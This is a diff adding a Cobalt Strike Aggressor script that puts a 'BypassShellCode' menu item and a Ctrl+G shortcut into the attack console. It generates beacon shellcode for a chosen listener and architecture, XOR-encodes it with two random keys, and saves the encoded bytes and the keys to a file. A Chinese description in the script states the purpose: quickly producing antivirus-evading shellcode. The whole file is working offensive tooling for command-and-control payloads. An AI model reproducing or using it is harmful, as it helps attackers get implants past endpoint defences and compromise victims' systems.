@@ -1,0 +1,52 @@
+popup attacks{
+	item("&BypassShellCode",{Generator();});
+}
+
+bind Ctrl+G{
+	Generator();
+}
+
+sub Generator{
+	$dialog = dialog("Generator", %(listener => "" , bit => false), &build);
+	drow_listener($dialog, "listener", "Listener: ");
+	dialog_description($dialog, "该插件用于快速生成免杀的shellcode");
+	dbutton_action($dialog, "Generate");
+	drow_checkbox($dialog, "bit", "x64: ", "使用64位的payload");
+	dialog_show($dialog);
+}
+
+sub build{
+	$a = $3["bit"] . "";
+
+	if ($3["bit"] eq "false"){
+		$system = "x86";
+		$arch = "386";
+	}else{
+		$system = "x64";
+		$arch = "amd64";
+	}
+	
+	$KEY_1 = rand(255);
+	$KEY_2 = rand(255);
+	$shell_code = shellcode($3["listener"], false, $system);
+	$shell_code = split("",$shell_code);
+	$arr = "";
+
+	for ($i = 0; $i < size($shell_code); $i++){
+		if ($i eq 0) {
+			$arr = $arr .asc($shell_code[$i]) ^ $KEY_1 ^ $KEY_2;
+		} else {
+			$arr = $arr . "," .asc($shell_code[$i]) ^ $KEY_1 ^ $KEY_2;
+		}
+	}
+
+	prompt_file_save("shellcode.txt", {
+		$path = "$1";
+		$handle = openf("> $+ $1");
+		writeb($handle, "Key1: " . $KEY_1 . "\r\n");
+		writeb($handle, "Key2: " . $KEY_2 . "\r\n");
+		writeb($handle, $arr);
+		closef($handle);
+		show_message("save to  $+ $1\r\nKey1: $KEY_1\r\nKey2: $KEY_2");
+	});
+}
